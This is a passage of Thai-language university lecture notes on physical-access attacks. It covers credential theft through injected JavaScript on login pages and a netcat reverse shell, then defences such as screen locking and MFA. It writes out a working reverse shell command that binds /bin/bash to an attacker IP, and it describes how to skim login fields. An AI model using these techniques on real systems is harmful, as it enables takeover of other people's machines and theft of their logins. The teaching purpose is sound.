</KeyIdea>

## ส่วนที่ 1 — มองจากมุมคนร้าย

### คิดแบบคนร้ายเพื่อจะกันคนร้าย

วิธีจะป้องกันตัวเองให้เก่งขึ้น คือต้องหัดคิดแบบคนที่จะมาเล่นงานเรา ให้พอรู้ว่าช่องอยู่ตรงไหน แล้วค่อยปิดมัน — คิดเฉย ๆ เท่านั้น ไม่ใช่ลงมือเป็นฝ่ายนั้นเสียเอง

<Analogy>
เหมือนตอนเตรียมสอบ เราลองคิดแบบคนออกข้อสอบ: คนออกข้อสอบคือคนร้าย บทที่เราอ่านไม่แน่นคือช่องโหว่ พอเดาได้ว่าเขาจะถามตรงไหน ก็ไปปิดจุดอ่อนนั้นก่อน — คาบนี้ก็ดูกลไกการโจมตีด้วยสายตาแบบนั้น เพื่อให้กันมันเป็น

อุปมานี้ใช้ไม่ได้ตรงที่ คนออกข้อสอบไม่ได้หนีเรา แต่คนร้ายเปลี่ยนวิธีทันทีที่ช่องเดิมถูกปิด
</Analogy>

อาจารย์ตั้งชื่อกิจกรรมของคาบนี้ว่า "Defend Against the Dark Arts" — ชื่อที่ย้ำว่าเราเรียนกลไกการโจมตีเพื่อกันมัน ไม่ใช่เพื่อไปก่อมันเอง

### เครื่องที่ถูกทิ้งไว้แป๊บเดียว

<Why>
เพื่อนวางโน้ตบุ๊กที่ปลดล็อกค้างไว้บนโต๊ะในห้องสมุด แล้วลุกไปเข้าห้องน้ำสักสองสามนาที เครื่องยังเปิดอยู่ ยังล็อกอินบัญชีของเพื่อนค้างอยู่ ในช่วงเวลานั้นมีคนแปลกหน้าเดินมานั่งลงหน้าเครื่อง เขาทำอะไรได้บ้างที่จะย้อนกลับมาเล่นงานเพื่อนทีหลัง
</Why>

**การได้เข้าถึงตัวเครื่องจริง ๆ นั้นอันตรายได้มาก** เพราะการควบคุมการเข้าถึงที่เรียนมาทั้งหมด — รหัสผ่าน สิทธิ์ของผู้ใช้ การเข้ารหัส — ออกแบบมากันคนที่อยู่ "อีกฝั่งของสาย"

แต่คนที่นั่งอยู่หน้าเครื่องที่ปลดล็อกแล้ว อยู่ในฐานะของผู้ใช้ที่ล็อกอินไว้ เขาจึงไม่ต้องเจาะอะไรเลย

<Term en="Physical Security" th="กันความเสี่ยงที่มาจากการเข้าถึงตัวเครื่อง" /> คือการลดความเสี่ยงต่อระบบและข้อมูลที่มาจากการเข้าถึงตัวอุปกรณ์โดยตรง

มันเป็นชั้นที่อยู่ "ก่อน" ชั้นซอฟต์แวร์ทั้งหมด เพราะถ้าชั้นนี้พังเสียแล้ว ชั้นที่เหลือมักไม่ได้ช่วยอะไร

### ไม่กี่นาทีหน้าเครื่องทำอะไรได้บ้าง

เวลาสั้น ๆ หน้าเครื่องเปิดช่องให้หลายอย่าง

- เสียบ <Term en="Keylogger" th="ตัวดักทุกปุ่มที่พิมพ์" /> คั่นระหว่างคีย์บอร์ดกับเครื่อง เพื่อเก็บทุกปุ่มที่เหยื่อพิมพ์ต่อจากนี้
- โคลนอุปกรณ์ เช่น คัดลอกบัตรเข้าออกหรือข้อมูลในโทรศัพท์
- ติดตั้งซอฟต์แวร์ที่เปิดช่องให้คุมเครื่องจากระยะไกล (ส่วนที่ 3)

spyware คือ keylogger เวอร์ชันซอฟต์แวร์ ทำงานคล้ายกันแต่เป็นโปรแกรมที่ฝังไว้แทนอุปกรณ์ อยู่ในรายชื่อภัยเก้าอย่างของ [Lecture 1](/2110413-csy/lecture-1#ส่วนที่-1--ปัญหานี้ใหญ่แค่ไหน)

ของพวกนี้ไม่จำเป็นต้องดูเหมือนเครื่องมือแฮ็กด้วยซ้ำ มีอุปกรณ์ที่หน้าตาเหมือน**ปลั๊กพ่วงไฟธรรมดา** แต่ข้างในเป็นคอมพิวเตอร์เต็มเครื่องที่ต่อเน็ตแล้วเปิดช่องให้คนร้ายเข้ามาคุมเครือข่ายจากข้างนอก ([ข่าว Power Pwn ที่ ZDNet](https://www.zdnet.com/article/power-pwn-this-darpa-funded-power-strip-will-hack-your-network/))

ที่มันน่ากลัวคือมันกลมกลืนไปกับของใช้ในออฟฟิศจนไม่มีใครสงสัย

<Quiz question="คนร้ายมีเวลาหน้าเครื่องที่ปลดล็อกแค่ 30 วินาที สั้นเกินกว่าจะอ่านไฟล์ให้ครบ เขาควรใช้เวลานี้ทำอะไรถึงจะได้ผลยาวที่สุด">
สิ่งที่คุ้มที่สุดเมื่อเวลาน้อยคือทิ้ง "ช่องกลับเข้ามา" ไว้ ไม่ใช่กวาดข้อมูลตรงนั้น เพราะข้อมูลมีจำกัดและอ่านไม่ทัน แต่ช่องทางเข้าทำให้กลับมาเอาได้เรื่อย ๆ หลังจากนี้

คำตอบคือ **ฝังอะไรที่ให้เขากลับเข้ามาได้ภายหลัง** เช่น เสียบ keylogger หรือเปิดช่องควบคุมระยะไกล แล้วเดินจากไปเฉย ๆ

คำตอบที่ผิดบ่อยคือ **รีบก็อปไฟล์ใส่แฟลชไดรฟ์** ซึ่งได้แค่สิ่งที่อยู่ตรงนั้นในวินาทีนั้น และถ้าเวลาหมดก่อนก็ไม่ได้อะไรเลย ขณะที่ช่องทางเข้าทำงานต่อให้เองแม้เจ้าของจะกลับมานั่งแล้ว
</Quiz>

## ส่วนที่ 2 — ขโมยรหัสผ่านด้วยการฉีด JavaScript

### โจทย์

<Why>
เพื่อนเพิ่งล็อกเอาท์ออกจาก ChulaSSO ก่อนลุกไป เครื่องยังปลดล็อก เบราว์เซอร์ยังเปิดอยู่ เรามีเวลาสองสามนาทีก่อนเขากลับมา จะทำยังไงให้พอเพื่อนกลับมาล็อกอินใหม่ แล้วเราได้ชื่อผู้ใช้กับรหัสผ่านของเขาไปด้วย
</Why>

กุญแจคือ **หน้าเว็บที่เปิดอยู่ในเบราว์เซอร์ รันโค้ด JavaScript ที่เราป้อนเข้าไปได้** และโค้ดนั้นรันด้วยสิทธิ์เท่ากับหน้าเว็บนั้นเอง มันจึงอ่านทุกช่องในฟอร์ม และเห็นทุกอย่างที่เหยื่อพิมพ์ลงไป

สคริปต์ที่คนร้ายวางไว้ จะดักจังหวะตอนเหยื่อกดปุ่ม login แล้วอ่านค่าที่อยู่ในช่อง Username กับ Password ตอนนั้น — เพราะตอนกดปุ่ม ค่าทั้งสองถูกพิมพ์ลงช่องเรียบร้อยแล้ว

### ป้อนโค้ดเข้าไปได้ทางไหน

มีสองทางที่คนร้ายจะเอาโค้ดเข้าไปรันในหน้านั้น และข้อแตกต่างของสองทางนี้มีประเด็นด้านการป้องกันอยู่

- **พิมพ์ `javascript:` หน้าโค้ดในแถบที่อยู่** — บางเบราว์เซอร์ตัดคำว่า `javascript:` ทิ้งเมื่อวางโค้ดลงไป ต้องพิมพ์คำนี้เองจึงจะรัน
- **เปิด JavaScript console แล้ววางโค้ดลงไป** — console รันโค้ดให้เสมอ

<Term en="JavaScript console" th="ช่องพิมพ์โค้ดในเบราว์เซอร์" /> อยู่ในเครื่องมือนักพัฒนา (developer tools) ของเบราว์เซอร์ เปิดได้ด้วยปุ่ม F12

วิธีพิสูจน์ว่าโค้ดที่ป้อนเข้าไปรันในหน้านั้นจริง ทำได้ด้วยบรรทัดสั้น ๆ ที่ไม่เป็นอันตราย คือสั่งให้มันเด้งกล่องข้อความขึ้นมา

```
javascript:alert('Hello from bad guy.')
```

ถ้าป้อนบรรทัดนี้แล้วกล่องเด้งขึ้น แปลว่าโค้ดของเรารันในบริบทของหน้านั้นได้ จากจุดนี้สคริปต์ที่อ่านค่าในฟอร์มก็ทำงานได้เช่นกัน

สคริปต์ที่ใช้พิสูจน์จะเด้งกล่องโชว์ค่าที่ดักได้ เช่น `Username:TestAccount Password:TestPassword` เพื่อให้เห็นว่าอ่านค่าได้จริง ส่วนการโจมตีจริงจะส่งค่านี้ออกไปให้คนร้ายตามรูปที่ 1

เรื่องนี้ไม่ได้ผูกกับ ChulaSSO หน้าล็อกอินไหนก็ตามที่เปิดอยู่ในเบราว์เซอร์ ไม่ว่าจะ Facebook หรือ Gmail ก็มีช่อง Username กับ Password เหมือนกัน และรันสคริปต์ที่ป้อนเข้าไปได้เหมือนกัน

<Pitfall>
พอเห็นว่าพิมพ์ `javascript:` ในแถบที่อยู่แล้วมันไม่ทำงาน หลายคนสรุปว่า "เบราว์เซอร์สมัยนี้กันการฉีดสคริปต์ได้แล้ว เครื่องเลยปลอดภัย"

ไม่จริง ที่แถบที่อยู่ไม่ยอมรันให้ เป็นเพราะเบราว์เซอร์ตั้งใจ**ตัดคำว่า `javascript:` ทิ้งตอนวาง** เพื่อกันเหยื่อถูกหลอกให้วางโค้ดของคนอื่นเข้าไปเอง — มันกันเฉพาะช่องทางเดียวเท่านั้น

ที่ดูเหมือนปลอดภัยเพราะช่องที่เห็นได้ง่ายที่สุดถูกปิด แต่ console เป็นเครื่องมือของนักพัฒนา มีไว้รันโค้ดในหน้าเว็บโดยตรง เบราว์เซอร์จึงปิดมันไม่ได้ อย่างมากแค่ขึ้นคำเตือนก่อนให้วาง คนที่นั่งอยู่หน้าเครื่องเปิด console เองได้สบาย ๆ สิ่งที่กันการโจมตีนี้จริง ๆ ไม่ใช่เบราว์เซอร์ แต่คือ**การไม่ปล่อยให้เครื่องที่ปลดล็อกอยู่ตกอยู่ในมือคนอื่น**
</Pitfall>

<Quiz question="เหยื่อไม่ได้พิมพ์รหัสผ่านเอง แต่ใช้ password manager ที่เติมรหัสให้อัตโนมัติเมื่อเปิดหน้าล็อกอิน สคริปต์ที่ฝังไว้ยังได้รหัสผ่านไปไหม">
ต้องถามว่ารหัสผ่านไปโผล่อยู่ตรงไหน สคริปต์อ่านค่าจาก**ช่องในฟอร์ม** ไม่ว่าใครเป็นคนใส่ค่านั้นลงไป เมื่อ password manager เติมรหัสให้ ค่าก็ไปนั่งอยู่ในช่อง password เหมือนกับที่คนพิมพ์เอง

คำตอบคือ **ได้** เพราะการเติมอัตโนมัติก็คือการใส่ค่าลงช่องนั้น และสคริปต์อ่านจากช่อง ไม่ได้อ่านจากแป้นพิมพ์

คำตอบที่ผิดบ่อยคือ **ไม่ได้ เพราะเหยื่อไม่ได้พิมพ์** ซึ่งเข้าใจผิดว่าสคริปต์ดักที่การพิมพ์ จริง ๆ มันอ่านที่ช่อง จุดที่ต่างคือ password manager ที่ดีจะเติมรหัสเฉพาะกับโดเมนที่ตรงกันเท่านั้น นั่นช่วยกัน phishing ที่หลอกด้วยโดเมนปลอม แต่ไม่ได้ช่วยในกรณีนี้ที่เป็นโดเมนจริงบนเครื่องของเจ้าของเอง
</Quiz>

## ส่วนที่ 3 — คุมเครื่องจากระยะไกลด้วย Reverse Shell

### โจทย์

<Why>
คราวนี้เราไม่ได้อยากได้แค่รหัสผ่าน เราอยากคุมเครื่องของเหยื่อต่อไปเรื่อย ๆ หลังเดินจากมาแล้ว และสั่งงานมันจากบ้านเราได้ด้วย ปัญหาคือเครื่องเหยื่ออยู่หลังไฟร์วอลล์ของเครือข่าย ซึ่งปิดไม่ให้คนข้างนอกต่อเข้ามา เราจะไปถึงมันได้ยังไง
</Why>

สมมติว่าคนร้ายได้รันโปรแกรมตัวหนึ่งบนเครื่องเหยื่อแล้ว อาจรันเองตอนนั่งอยู่หน้าเครื่องที่ปลดล็อก หรือหลอกให้เหยื่อติดตั้งเอง โปรแกรมแบบหลังคือ <Term en="Trojan Horse" th="โปรแกรมที่ดูปกติแต่ซ่อนของร้ายไว้ข้างใน" /> ที่อยู่ในรายชื่อภัยของ [Lecture 1](/2110413-csy/lecture-1#ส่วนที่-2--ภัยเข้าถึงเราได้สองทาง)

ของที่ซ่อนอยู่คราวนี้คือช่องให้คนร้ายคุมเครื่องเหยื่อจากไกล ๆ

<Callout type="info" title="เสริม — Slammer ระบาดจริงปี 2003 ไม่ใช่ 2006">
สไลด์บอกว่าสถานการณ์นี้ดัดแปลงมาจากหนอน MSSQL Slammer ที่แพร่ราวปี 2006 ที่จริง Slammer (อีกชื่อคือ Sapphire) ระบาดช่วงวันที่ 25 มกราคม **2003** และมันแพร่คนละแบบกับ reverse shell ในคาบนี้ — ที่ตรงกันมีแค่แนวคิดกว้าง ๆ คือการเข้าไปสั่งงานเครื่องเหยื่อจากระยะไกล

<Detail label="หนอน Slammer แพร่ยังไง">
Slammer อาศัยช่องโหว่ buffer overflow ใน Microsoft SQL Server แล้วแพร่ตัวเองต่อโดยอัตโนมัติ ไม่ต้องรอให้ใครเผลอติดตั้ง จึงขยายตัวเร็วจนเล่ากันว่าจำนวนเครื่องที่ติดเพิ่มเป็นสองเท่าทุก ๆ ไม่กี่วินาทีในช่วงแรก ส่วนการหลอกให้ติดตั้งเองแบบ Trojan เป็นคนละกลไกกัน และโยงกับหลักการ [Don't extend trust easily ของ Lecture 1](/2110413-csy/lecture-1#หลักการที่-9--dont-extend-trust-easily)
</Detail>
</Callout>

### เครื่องมือ: netcat

ตัวที่ใช้สาธิตคือ <Term en="netcat" th="เครื่องมือต่อสายรับส่งข้อมูลผ่านเครือข่าย" /> หรือ `nc` มันทำหน้าที่ง่าย ๆ คือต่อสายระหว่างสองเครื่องแล้วส่งข้อมูลไปมา

วิธีลงต่างกันไปตามระบบปฏิบัติการ

- **Mac** — ลงผ่าน Homebrew ด้วย `brew install netcat`
- **Windows** — ใช้ cygwin หรือไฟล์ที่ build ไว้แล้ว
- **Linux (Debian)** — `apt install netcat-traditional`

บน Linux รุ่น traditional สำคัญ เพราะมีตัวเลือกตัวหนึ่งที่รุ่นใหม่ ๆ ตัดออกไปแล้ว (เดี๋ยวจะเห็นว่าคือตัวไหนและทำไม)

### สองคำสั่งที่ประกอบกันเป็นเชลล์ทางไกล

<Term en="Reverse Shell" th="เครื่องเหยื่อเป็นฝ่ายต่อสายออกไปหาคนร้าย" /> เกิดจากคำสั่งสองฝั่งที่ทำงานคู่กัน ฝั่งคนร้ายเปิดพอร์ตรอ ฝั่งเหยื่อต่อสายออกไปหา โดยเอา `/bin/bash` ของตัวเองผูกติดไปกับสายนั้น

พอร์ตคือเลขที่บอกว่าข้อมูลที่มาถึงเครื่องเป็นของโปรแกรมไหน คำสั่ง `nc -l -p 60000` จึงสั่งให้ nc เฝ้ารอข้อมูลที่เข้ามาที่เลข 60000

```
# attacker: open port 60000 and listen for a connection
nc -l -p 60000

# victim: dial out to the attacker, binding /bin/bash to the line
nc.traditional -e /bin/bash 192.168.0.121 60000
```

`-e /bin/bash` คือหัวใจ มันสั่งให้ netcat เอา input/output ของเชลล์ `/bin/bash` ไปต่อเข้ากับสายโดยตรง

ผลคือ ทุกอย่างที่คนร้ายพิมพ์ที่ปลายสายของตัวเอง จะวิ่งไปเป็นคำสั่งที่รันใน bash ของเหยื่อ แล้วผลลัพธ์วิ่งกลับมาโผล่ที่จอคนร้าย

`-e` นี่เองคือตัวเลือกที่มีเฉพาะใน netcat รุ่น traditional ฝั่งเหยื่อจึงต้องเรียก `nc.traditional` ส่วนรุ่นใหม่ตัด `-e` ออก เพราะมันยกเชลล์ให้ใครก็ตามที่อยู่ปลายสายได้ ซึ่งอันตรายเกินไป ฝั่งคนร้ายที่แค่เปิดพอร์ตฟังรอไม่ได้ใช้ `-e` จึงใช้ `nc` รุ่นไหนก็ได้

`192.168.0.121` คือ IP ของเครื่องคนร้าย

เลข `192.168.x.x` เป็น <Term en="private IP" th="IP ที่ใช้ได้แค่ในวงเดียวกัน" /> ต่อถึงกันได้เฉพาะเครื่องที่อยู่วงเดียวกัน สองเครื่องในตัวอย่างจึงต้องอยู่ WiFi เดียวกัน เช่นแชร์ฮอตสปอตจากมือถือ

ถ้าจะคุมเครื่องจากบ้านจริง ๆ อย่างในโจทย์ คนร้ายต้องใส่ public IP ของตัวเองแทน เพราะ private IP นี้ใช้ได้แค่ในวงเดียวกัน

  <ReverseShell />
</Figure>

พอต่อสายติดแล้ว คนร้ายพิมพ์คำสั่งธรรมดา ๆ เพื่อดูว่ากำลังคุมเครื่องไหนอยู่ — ลองทายก่อน: ชื่อเครื่องและพาธที่ขึ้นมาจะเป็นของใคร

```
pwd
/home/krerk
uname -a
Linux cony 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2 (2019-08-28) x86_64 GNU/Linux
```

ชื่อเครื่อง `cony` และพาธ `/home/krerk` ที่โผล่มา เป็นของ**เครื่องเหยื่อ** ไม่ใช่ของคนร้าย ทั้งที่คนร้ายเป็นคนพิมพ์คำสั่ง นั่นคือเครื่องยืนยันว่าเชลล์ที่คุมอยู่เป็นของอีกเครื่องหนึ่ง

### ทำไมต้องให้เหยื่อเป็นฝ่ายต่อออก

<Pitfall>
ความเชื่อที่พบบ่อยคือ "ไฟร์วอลล์ปิดพอร์ตขาเข้าหมดแล้ว คนข้างนอกก็ต่อเข้าเครื่องเราไม่ได้ เครื่องเลยปลอดภัย"

ไม่จริงสำหรับ reverse shell เพราะ**เครื่องเหยื่อเป็นฝ่ายต่อสายออกไปเอง** ไม่ใช่คนร้ายต่อเข้ามา

ที่ดูเหมือนปลอดภัย เพราะไฟร์วอลล์ส่วนใหญ่เข้มกับขาเข้า แต่ปล่อยขาออกค่อนข้างอิสระ (ไม่งั้นเปิดเว็บก็ไม่ได้) การโจมตีนี้จึงพลิกทิศ ให้โค้ดที่รันอยู่บนเครื่องเหยื่อแล้วเป็นคนเริ่มต่อออกไปหาคนร้าย เมื่อสายเปิดจากข้างในออกไป ไฟร์วอลล์มองว่าเป็นทราฟฟิกขาออกปกติ จึงปล่อยผ่าน

สิ่งที่กันได้จริงคือ การไม่เปิดโอกาสให้โค้ดแปลกปลอมไปรันบนเครื่องตั้งแต่แรก และการคุมทราฟฟิก**ขาออก**ด้วย ไม่ใช่แค่ขาเข้า
</Pitfall>

<Quiz question="ถ้าสลับกัน ให้เครื่องเหยื่อเป็นฝ่ายเปิดพอร์ตฟังรอ แล้วคนร้ายต่อเข้าไป จะเจอปัญหาอะไรเมื่อเหยื่ออยู่หลังไฟร์วอลล์หรือ NAT (Network Address Translation) ของเราเตอร์บ้าน">
แบบที่สลับให้เหยื่อเป็นฝ่ายเปิดพอร์ตรอ แล้วคนร้ายต่อเข้าไป เรียกว่า <Term en="Bind Shell" th="เครื่องเหยื่อเปิดพอร์ตรอให้คนร้ายต่อเข้ามา" /> ต้องถามว่าใครต่อหาใคร ถ้าเหยื่อเปิดพอร์ตรอ คนร้ายต้องต่อ "เข้า" หาเหยื่อ ซึ่งเป็นทิศขาเข้า

(NAT คือการที่เราเตอร์ให้หลายเครื่องใช้ IP สาธารณะร่วมกัน การต่อขาเข้าที่ไม่มีใครเริ่มจากข้างในจึงไม่รู้จะส่งให้เครื่องไหน ผลจึงกันขาเข้าเหมือนไฟร์วอลล์)

คำตอบคือ **ไฟร์วอลล์หรือ NAT ที่กันขาเข้าจะบล็อกการต่อของคนร้าย** ทำให้ bind shell ใช้ไม่ได้ในสภาพแวดล้อมแบบนี้ นี่คือเหตุผลที่ reverse shell เป็นที่นิยมกว่า — มันพลิกให้เหยื่อต่อออก จึงเลี่ยงด่านขาเข้าได้

คำตอบที่ผิดบ่อยคือ **เหมือนกันทั้งคู่ แค่สลับฝั่งที่พิมพ์คำสั่ง** ซึ่งมองข้ามว่าทิศของการต่อสายเป็นตัวตัดสินว่าไฟร์วอลล์จะปล่อยผ่านหรือบล็อก
</Quiz>

## ส่วนที่ 4 — ปิดช่องทั้งหมดนี้

### จุดร่วมของทุกฉาก

<Why>
ในคาบนี้ ทั้งการขโมยรหัสผ่านและการฝัง reverse shell เดินเรื่องจากเงื่อนไขเดียวกัน คือ **มีเครื่องที่ปลดล็อกอยู่ ถูกทิ้งไว้ให้คนอื่นเข้าถึงได้ชั่วขณะ** ถ้าจะปิดช่อง ก็ต้องปิดที่เงื่อนไขร่วมนี้ก่อน แล้วค่อยเสริมชั้นอื่นไว้เผื่อพลาด
</Why>

การป้องกันไม่ใช่เรื่องเดียวแต่เป็นหลายชั้นซ้อนกัน — แนวคิด <Term en="Defense in Depth" th="ป้องกันหลายชั้น เผื่อชั้นหนึ่งพลาด" /> ที่เป็นหลักการข้อหนึ่งใน [Lecture 1](/2110413-csy/lecture-1#หลักการที่-2--defense-in-depth)

| ป้องกัน | ปิดช่องไหน |
| --- | --- |
| ล็อกหน้าจอทุกครั้งที่ลุกจากเครื่อง และตั้งล็อกอัตโนมัติ | ตัดหน้าต่างเวลาที่คนอื่นได้นั่งหน้าเครื่องที่ปลดล็อก — ต้นตอของทุกฉาก |
| ดูแลและเก็บรักษาตัวอุปกรณ์ให้ดี | กัน keylogger อุปกรณ์แปลกปลอม และการโคลนเครื่อง |
| ตรวจตั้งค่าความเป็นส่วนตัวและความปลอดภัยให้รัดกุม | ลดสิ่งที่คนร้ายฉวยได้เมื่อเข้าถึงเครื่อง |
| ปิดหรือถอดกล้องเมื่อไม่ได้ใช้ | กันการแอบดูผ่านกล้อง |
| เปิด <Term en="Multi-Factor Authentication" th="ยืนยันตัวตนหลายปัจจัย" /> (MFA) | ทำให้ลำพังรหัสผ่านที่ถูกขโมยไป ยังล็อกอินไม่ได้ |

MFA ที่อยู่แถวสุดท้ายคือตัวรับหลังบ้านของส่วนที่ 2 โดยตรง — ต่อให้คนร้ายได้รหัสผ่านไปแล้ว เขายังขาดปัจจัยที่สอง (สิ่งที่เหยื่อถือ เช่น โทรศัพท์) รายละเอียดของการยืนยันหลายปัจจัยอยู่ใน [Lecture 3](/2110413-csy/lecture-3#multi-factor-authentication)

<Quiz question="ถ้าเลือกมาตรการได้แค่ข้อเดียว ข้อไหนปิดช่องของทั้งสองฉากในคาบนี้พร้อมกัน และเพราะอะไร">
ต้องมองหาเงื่อนไขที่ทั้งสองฉากใช้ร่วมกัน ทั้งการฉีด JavaScript และการฝัง reverse shell ต่างต้องการให้คนร้ายได้ลงมือบนเครื่องที่ปลดล็อกและไม่มีคนเฝ้า ถ้าตัดเงื่อนไขนี้ ทั้งคู่ก็เริ่มไม่ได้เลย

คำตอบคือ **ล็อกหน้าจอเมื่อลุกจากเครื่อง (และตั้งล็อกอัตโนมัติ)** เพราะมันปิดที่ต้นทางร่วมของทั้งสองฉาก

คำตอบที่ผิดบ่อยคือ **MFA** ซึ่งเป็นมาตรการที่ดีและช่วยเรื่องรหัสผ่านที่รั่ว แต่มันไม่ได้ขวาง reverse shell เลย เพราะคนที่นั่งหน้าเครื่องที่ล็อกอินค้างอยู่ รันคำสั่งได้โดยไม่ต้องยืนยันตัวตนซ้ำ MFA จึงเป็นชั้นเสริม ไม่ใช่ชั้นที่ปิดต้นตอ
</Quiz>

### เขียนสรุปบทเรียนของตัวเอง

ปิดท้ายด้วยคำถามสองข้อที่ควรตอบให้ได้ด้วยคำพูดของตัวเอง

- ฉากที่แย่ที่สุดที่คนร้ายทำได้ด้วยเวลาไม่กี่นาทีหน้าเครื่องเรา คืออะไร
- เราจะกันตัวเองจากการโจมตีแบบนั้นได้ยังไง

<Recap>

**[มองจากมุมคนร้าย](#ส่วนที่-1--มองจากมุมคนร้าย)**

- **การได้เข้าถึงตัวเครื่องจริง ๆ อันตรายได้มาก** คนที่นั่งหน้าเครื่องที่ปลดล็อก อยู่ในฐานะเจ้าของ จึงข้ามการป้องกันด้วยซอฟต์แวร์ทั้งหมด
- **Physical Security** คือการลดความเสี่ยงต่อระบบและข้อมูลที่มาจากการเข้าถึงตัวอุปกรณ์โดยตรง มันเป็นชั้นที่อยู่ก่อนชั้นซอฟต์แวร์
- ไม่กี่นาทีหน้าเครื่องทำได้ถึงขั้นทิ้ง "ช่องกลับเข้ามา" ไว้ เช่น keylogger การโคลนอุปกรณ์ หรือช่องคุมเครื่องระยะไกล และอุปกรณ์โจมตีไม่จำเป็นต้องดูเหมือนเครื่องมือแฮ็ก (เช่น Power Pwn ที่หน้าตาเป็นปลั๊กพ่วง)

**[ขโมยรหัสผ่านด้วย JavaScript](#ส่วนที่-2--ขโมยรหัสผ่านด้วยการฉีด-javascript)**

- หน้าเว็บรันโค้ด JavaScript ที่ป้อนเข้าไปได้ ด้วยสิทธิ์เท่าหน้าเว็บนั้น สคริปต์จึง**อ่านค่าในช่องล็อกอิน**ได้ตรง ๆ
- ป้อนโค้ดได้ทาง `javascript:` ในแถบที่อยู่ (บางเบราว์เซอร์ตัดทิ้งเพื่อกันการถูกหลอกให้วาง) หรือทาง JavaScript console ซึ่งรันให้เสมอ
- เบราว์เซอร์กันได้แค่ช่องเดียว สิ่งที่กันจริงคือ **ไม่ปล่อยเครื่องที่ปลดล็อกให้คนอื่น** และ password manager ที่เติมค่าให้ก็ยังถูกสคริปต์อ่านได้

**[Reverse Shell](#ส่วนที่-3--คุมเครื่องจากระยะไกลด้วย-reverse-shell)**

- **Reverse Shell** = เครื่องเหยื่อเป็นฝ่ายต่อสายออกไปหาคนร้าย โดยผูก `/bin/bash` ติดไปกับสายด้วย `-e` คำสั่งของคนร้ายจึงไปรันในเชลล์ของเหยื่อ
- ฝั่งที่**ต่อออก**และผูก `/bin/bash` ไว้กับสาย (เหยื่อ) คือฝั่งที่มอบเชลล์ ส่วนฝั่งที่**ฟังพอร์ต** (คนร้าย) เป็นฝ่ายสั่งงาน
- เหตุที่ให้เหยื่อต่อออก เพราะไฟร์วอลล์เข้มกับขาเข้าแต่ปล่อยขาออก **reverse shell จึงผ่านไฟร์วอลล์ที่ bind shell ผ่านไม่ได้**
- สถานการณ์นี้ดัดแปลงมาจากหนอน SQL Slammer (ระบาดจริงปี 2003)

**[ปิดช่องทั้งหมดนี้](#ส่วนที่-4--ปิดช่องทั้งหมดนี้)**

- จุดร่วมของทุกฉากคือ **เครื่องปลดล็อกที่ถูกทิ้งไว้** ปิดที่ต้นตอนี้ก่อนด้วยการล็อกหน้าจอและตั้งล็อกอัตโนมัติ
- เสริมเป็นชั้น ๆ แบบ **Defense in Depth**: ดูแลตัวอุปกรณ์, ตั้งค่าความเป็นส่วนตัว/ความปลอดภัย, ปิดหรือถอดกล้องเมื่อไม่ใช้, และเปิด **MFA**
- **MFA** ทำให้ลำพังรหัสผ่านที่ถูกขโมยยังล็อกอินไม่ได้ แต่ไม่ได้ขวาง reverse shell จึงเป็นชั้นเสริม ไม่ใช่ชั้นที่ปิดต้นตอ
